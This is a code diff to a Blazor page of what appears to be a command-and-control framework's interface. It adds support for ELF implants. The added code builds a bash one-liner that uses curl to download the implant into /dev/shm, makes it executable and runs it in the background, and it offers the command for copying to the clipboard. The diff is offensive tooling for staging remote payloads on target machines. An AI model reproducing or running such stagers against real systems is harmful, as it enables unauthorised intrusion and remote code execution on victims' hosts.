@@ -133,6 +133,22 @@ else
                                     </div>
                                 </div>
                             }
+                            else if (selectedImplant.Config?.Type == ImplantType.Elf)
+                            {
+                                <!-- Bash Script (ELF) -->
+                                var downloadUrl = implantUrl;
+                                var bashScript = $"curl -s -o /dev/shm/{selectedImplant.Config.ImplantName} {downloadUrl} && chmod +x /dev/shm/{selectedImplant.Config.ImplantName} && /dev/shm/{selectedImplant.Config.ImplantName} &";
+                                
+                                <div class="mb-3">
+                                    <label class="form-label fw-bold">Bash Oneliner</label>
+                                    <div class="input-group">
+                                        <input type="text" class="form-control font-monospace" readonly value="@bashScript" />
+                                        <button class="btn btn-outline-secondary" @onclick="() => CopyToClipboard(bashScript)">
+                                            <i class="bi bi-clipboard"></i> Copy
+                                        </button>
+                                    </div>
+                                </div>
+                            }
                             else
                             {
                                 <!-- PowerShell Download Script -->
